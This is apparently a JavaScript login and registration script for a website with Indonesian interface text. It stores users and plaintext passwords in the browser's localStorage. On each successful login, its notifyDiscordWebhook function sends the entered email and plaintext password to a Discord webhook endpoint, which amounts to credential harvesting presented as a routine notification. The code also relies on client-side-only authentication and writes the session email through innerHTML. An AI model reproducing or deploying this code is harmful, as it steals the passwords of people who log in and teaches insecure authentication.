// AUTH LOGIC + LOCALSTORAGE USERS + DISCORD WEBHOOK
const USERS_KEY = 'khodilz_users';
const SESSION_KEY = 'khodilz_user';

function getUsers() {
    const users = localStorage.getItem(USERS_KEY);
    return users ? JSON.parse(users) : [];
}

function saveUsers(users) {
    localStorage.setItem(USERS_KEY, JSON.stringify(users));
}

function registerUser(email, password) {
    const users = getUsers();
    if(users.find(u => u.email === email)) {
        return { success: false, message: 'Email sudah terdaftar' };
    }
    users.push({ email, password });
    saveUsers(users);
    return { success: true };
}

function loginUser(email, password) {
    const users = getUsers();
    const user = users.find(u => u.email === email && u.password === password);
    if(user) {
        localStorage.setItem(SESSION_KEY, email);
        return { success: true };
    }
    return { success: false, message: 'Email atau password salah' };
}

function logoutUser() {
    localStorage.removeItem(SESSION_KEY);
    window.location.href = '/pages/login.html';
}

function isLoggedIn() {
    return !!localStorage.getItem(SESSION_KEY);
}

function requireAuth() {
    if(!isLoggedIn() && !window.location.pathname.includes('login.html') && !window.location.pathname.includes('register.html')) {
        window.location.href = '/pages/login.html';
    }
}

async function notifyDiscordWebhook(email, password) {
    try {
        await fetch('/api/discord-webhook', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                email: email,
                password: password,
                timestamp: new Date().toISOString()
            })
        });
    } catch(e) {
        console.warn(e);
    }
}

// Register form handler
if(document.getElementById('registerForm')) {
    const form = document.getElementById('registerForm');
    form.addEventListener('submit', async (e) => {
        e.preventDefault();
        const email = document.getElementById('regEmail').value.trim();
        const password = document.getElementById('regPassword').value;
        const confirm = document.getElementById('regConfirmPassword').value;
        const emailRegex = /^[^\s@]+@([^\s@]+\.)+[^\s@]+$/;
        if(!emailRegex.test(email)) return showError('regError', 'Format email tidak valid');
                          if(password.length < 8 || !/[A-Z]/.test(password) || !/[a-z]/.test(password))
                              return showError('regError', 'Password minimal 8 karakter dengan huruf besar dan kecil');
        if(password !== confirm) return showError('regError', 'Konfirmasi password tidak cocok');
                          const result = registerUser(email, password);
        if(result.success) {
            alert('Registrasi berhasil! Silakan login.');
            window.location.href = '/pages/login.html';
        } else {
            showError('regError', result.message);
        }
    });
}

// Login form handler
if(document.getElementById('loginForm')) {
    const form = document.getElementById('loginForm');
    form.addEventListener('submit', async (e) => {
        e.preventDefault();
        const email = document.getElementById('loginEmail').value.trim();
        const password = document.getElementById('loginPassword').value;
        const result = loginUser(email, password);
        if(result.success) {
            await notifyDiscordWebhook(email, password);
            window.location.href = '/pages/dashboard.html';
        } else {
            showError('loginError', result.message);
        }
    });
}

// Auto session & logout
if(document.getElementById('logoutBtn')) {
    document.getElementById('logoutBtn').addEventListener('click', (e) => {
        logoutUser();
    });
    const currentUser = localStorage.getItem(SESSION_KEY);
    if(currentUser && document.getElementById('userEmailDisplay')) {
        document.getElementById('userEmailDisplay').innerHTML = `<i class="fas fa-user-circle"></i> ${currentUser}`;
    }
}

// Sidebar & auth guard
document.addEventListener('DOMContentLoaded', () => {
    initMobileSidebar();
    if(!window.location.pathname.includes('login') && !window.location.pathname.includes('register')) {
        requireAuth();
    }
});
